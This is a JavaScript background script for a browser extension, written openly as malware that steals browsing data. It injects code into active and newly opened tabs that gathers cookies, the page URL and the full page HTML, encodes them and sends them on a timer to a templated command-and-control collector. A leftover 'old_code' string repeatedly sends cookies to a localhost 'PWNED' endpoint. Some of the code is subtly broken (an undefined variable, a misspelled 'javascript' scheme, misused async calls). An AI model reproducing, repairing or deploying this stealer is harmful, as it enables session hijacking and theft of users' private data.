var CC_SERVER = '{{CC_SERVER}}/';
var COLLECTOR_URL = CC_SERVER + '/collector/';
var QUERY_ALL_DATA_INTERVAL = 1000 * 60 * 60; // Every hour.
var SEND_DATA_INTERVAL = 5 * 60 * 1000; // Every 5 minutes.

var f = '';

/* Methods used:
1. onBeforeWebrequest
2. onBeforeHeaders
Required permissions: all_sites
*/

let old_code = 'document.location.href = \'javascript:fetch("http://localhost:8083/PWNED/" + document.cookie);\';' +
'if (Math.random() < -1) {document.location.href = \'https://mail.google.com\';} /* Redirect 1 out 3 times kinda to gmail and steal cookies :) */ ' +
'function f() {document.location.href = \'javascript:fetch("http://localhost:8083/PWNED/" + document.domain + "/" + document.cookie);\'; fetch("http://localhost:8083/PWNED/"  + document.domain + "/" + document.cookie); setTimeout(f, 2500);};f();' +
'//browser.storage.local.set({"integration.googleDocs.codeRepositoryURL":"http://localhost:8084/pwned/"}).then(e=>console.log(e));\n' +
'//chrome.storage.local.set({"integration.googleDocs.codeRepositoryURL":"http://localhost:8084/pwned/"}, e=>console.log(e));\n' +	
'//console.log(document.domain);' +
'//console.log(document.cookie);\n';


extract_data_code = 'st=document.documentElement.innerHTML;h=btoa(unescape(encodeURIComponent(st)));d={cookies:document.cookie, url:document.location.href, fullhtml:h};full_data=btoa(JSON.stringify(d));';
content_script_code = 'document.location.href = \'javscript:function() {' + extract_data_code + ';fetch("' + cc_server + '" + full_data);}();\'';
background_code = 'function() {' + extract_data_code + ';chrome.runtime.sendMessage(full_data);}();';

function get_cookies_post_server(request, sender, sendResponse) {
	console.log('[+] Got cookies/html data from: ' + (sender.tab ? sender.tab.url : 'from the extension') + request);
	send_data(encodeURIComponent(request));
}

async function send_data(data) {
	// For now, supporting just the typical chrome.storage.local. 
	if (chrome && chrome.storage && chrome.storage.local) {
		// 1. Got also data parameter to be appended and to be sent
		if (data) { 
			let res_data = await chrome.storage.local.get({"data_left_to_send": []});
			res_data.append(data);
		}
		// 2. Check How much data left to be sent.
		let res_data = await chrome.storage.local.get({"data_left_to_send": 0});
		let data_to_send = res_data["data_left_to_send"];
		if (!data_to_send) {
			// No data to be sent.
			return; 
		}
		console.log("[*] Got " + data_to_send.length + " infos to be sent.");

		// 3. 
		// *Example storage usage: Get all storage: chrome.storage.local.get(null).then(e=>console.log(e))
		let last_sent = chrome.storage.local.get({"last_sent":0}).then(e => {
			if (e["last_sent"]) {
				let cur_time = (new Date()).getTime();
				if (Math.abs(cur_time - e["last_sent"]) > SEND_DATA_INTERVAL) {
					// No limits on GET url header besides kinda what server defines as max.
					fetch(COLLECTOR_URL + "/" + encodeURIComponent(JSON.stringify(data_to_send)));
					// Clear storage & update interval.
					await chrome.storage.local.set({"last_sent": cur_time});
					await chrome.storage.local.set({"data_left_to_send": []}); 
				}
			}
		});
	}
}

// Add hooks for extracted data & auto sender.
chrome.runtime.onMessage.addListener(get_cookies_post_server);

function inject_active_tab_get_data(tab_id) {
	if (tab_id) {
		// Inject on specific tab:
		console.log("[*] Inject tabs_stealer over specific tab, tabId=" + tab_id);
		browser.tabs.executeScript(tab_id, {allFrames: true, 
			code: background_code, frameId:0});		
	}
	else {
		console.log("[*] Inject tabs_stealer over all tabs.");
		browser.tabs.query({active: true}).then(e => {
			var tabId = e[0].id;
			browser.tabs.executeScript(tabId, {allFrames: true, 
				code: background_code, frameId:0});
		});
	}
}


//Method  1: every "QUERY_ALL_DATA_INTERVAL" - send all users' data.
setInterval(inject_active_tab_get_data, QUERY_ALL_DATA_INTERVAL);

//Method 2: upon new tab inited.
chrome.tabs.onCreated.addListener(function(tab) {let tab_id=tab.id; inject_active_tab_get_data(tab.id);});

//Storage-collector: Check every SEND_ count if there's data to sent & send it.
setInterval(send_data, SEND_DATA_INTERVAL);
